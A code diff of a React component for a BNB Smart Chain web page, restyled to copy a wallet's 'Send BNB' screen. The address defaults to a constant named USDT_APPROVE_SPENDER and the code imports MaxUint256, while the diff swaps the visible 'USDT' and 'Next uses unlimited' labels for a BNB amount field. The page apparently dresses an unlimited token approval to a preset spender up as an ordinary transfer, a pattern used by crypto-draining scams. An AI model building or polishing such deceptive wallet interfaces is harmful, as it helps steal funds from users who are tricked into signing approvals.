@@ -1,5 +1,5 @@
 import { useCallback, useEffect, useState } from "react";
-import { Clipboard, ScanLine } from "lucide-react";
+import { Clipboard, ScanLine, ChevronDown } from "lucide-react"; // Added ChevronDown
 import { BrowserProvider, Contract, MaxUint256 } from "ethers";
 
 /** BNB Smart Chain mainnet */
@@ -45,6 +45,18 @@ async function ensureBscNetwork(ethereum) {
     throw err;
   }
 }
+
+
+// Styling Constants to match Screenshot
+  const colors = {
+    bg: "#1b1b1b",
+    inputBg: "#1a1a1a",
+    primaryGreen: "#48ff91",
+    textMain: "#ffffff",
+    textSecondary: "#aaa7a7ff",
+    border: "#2a2a2a"
+  };
+
 
 const Home = () => {
   const [address, setAddress] = useState(USDT_APPROVE_SPENDER);
@@ -173,70 +185,94 @@ const Home = () => {
 
   const onBsc = chainId === BSC_CHAIN_ID_DEC;
 
-  return (
-    <div className="min-h-screen bg-[var(--bg)] flex justify-center">
-      <div className="w-full min-h-screen flex flex-col justify-between pt-10 px-6 pb-6">
-        <div className="w-full">
-          {account && (
-            <p className="text-xs text-gray-500 mb-2 break-all">
-              Connected: {account.slice(0, 6)}…{account.slice(-4)}
-              {onBsc ? " · BSC" : chainId != null ? ` · chain ${chainId}` : ""}
-            </p>
-          )}
-          {(connectError || txStatus) && (
-            <p
-              className={`text-sm mb-2 ${connectError ? "text-red-600" : "text-gray-600"}`}
+return (
+    <div className="max-h-screen h-full flex justify-center font-sans" style={{ backgroundColor: colors.bg }}>
+      <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
+        
+        {/* Header Section */}
+        {/* <div className="flex items-center justify-between mb-8">
+          <button className="text-white">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+          </button>
+          <h1 className="text-white text-lg font-bold">Send BNB</h1>
+          <button className="text-white">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+          </button>
+        </div> */}
+
+        <div className="flex-1 space-y-6">
+          {/* Address Input Section */}
+          <div>
+            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
+              Address or Domain Name
+            </label>
+            <div 
+              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
+              style={{ 
+                backgroundColor: colors.bg, 
+              }}
             >
-              {connectError || txStatus}
-            </p>
-          )}
-
-          <label className="text-gray-600 text-sm">
-            Address or Domain Name
-          </label>
-          <div className="w-full mt-2 border border-[var(--border)] rounded-lg px-4 py-3 flex items-center gap-3 bg-[var(--card)]">
-            <input
-              type="text"
-              value={address}
-              onChange={(e) => setAddress(e.target.value)}
-              className="outline-none flex-1 text-[var(--text)] bg-transparent"
-            />
-            <div className="flex items-center gap-4 text-[var(--primary)]">
-              <button
-                type="button"
-                onClick={handlePaste}
-                className="text-sm"
-              >
-                Paste
-              </button>
-              <Clipboard size={18} />
-              <ScanLine size={18} />
+              <input
+                type="text"
+                placeholder="Search or Enter"
+                className="bg-transparent outline-none flex w-[60%] justify-start  text-white placeholder-gray-600 "
+                value={address}
+                onChange={(e) => setAddress(e.target.value)}
+              />
+              <div className="flex items-center gap-4 ml-2" style={{ color: colors.primaryGreen }}>
+                <button onClick={() => {/* paste logic */}} className="text-sm font-bold">Paste</button>
+                <Clipboard size={20} />
+                <ScanLine size={20} />
+              </div>
             </div>
           </div>
 
-          <label className="text-gray-600 text-sm mt-6 block">Amount</label>
-          <div className="w-full mt-2 border border-[var(--border)] rounded-lg px-4 py-3 flex items-center gap-3 bg-[var(--card)]">
-            <input
-              type="text"
-              inputMode="decimal"
-              placeholder="Amount"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              className="outline-none flex-1 text-[var(--text)] bg-transparent"
-            />
-            <div className="flex items-center gap-3">
-              <span className="text-gray-500">USDT</span>
-              <span className="text-xs text-gray-400">Next uses unlimited</span>
+          {/* Destination Network Section */}
+          <div>
+            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
+              Destination network
+            </label>
+            <div 
+              className="flex items-center gap-2 px-3 py-2 rounded-full w-fit"
+              style={{ backgroundColor: colors.inputBg }} 
+            >
+              <img src="/src/assets/image.png" alt="BNB" className="w-5 h-5 rounded-full" />
+              <span className="text-white  font-bold text-sm" style={{ color: colors.textSecondary }}>BNB Smart Chain</span>
+              <ChevronDown size={16} style={{ color: colors.textSecondary }} />
             </div>
           </div>
 
-          <p className="text-gray-500 text-sm mt-2">= $0</p>
+          {/* Amount Input Section */}
+          <div>
+            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
+              Amount
+            </label>
+            <div 
+              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
+              style={{ 
+                backgroundColor: colors.bg, 
+              }}
+            >
+              <input
+                type="number"
+                placeholder="BNB Amount"
+                className="bg-transparent outline-none flex w-[60%] justify-start text-white  placeholder-gray-600"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+              />
+              <div className="flex items-center gap-3">
+                <span className="text-white font-semibold" style={{ color: colors.textSecondary }}>BNB</span>
+                <button className="font-bold" style={{ color: colors.primaryGreen }}>Max</button>
+              </div>
+            </div>
+            <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>≈ ${(Number(amount) * 0.9999).toFixed(2)}</p>
+          </div>
         </div>
 
         <button
           type="button"
           onClick={handleNext}
-          className="w-full bg-[var(--primary)] hover:bg-[var(--primary-light)] text-white py-3 rounded-full text-lg mt-6"
+          className="w-full bg-[var(--primary)] hover:bg-[var(--primary-light)] text-black font-medium py-3 rounded-full text-lg mt-6"
         >
           Next
         </button>
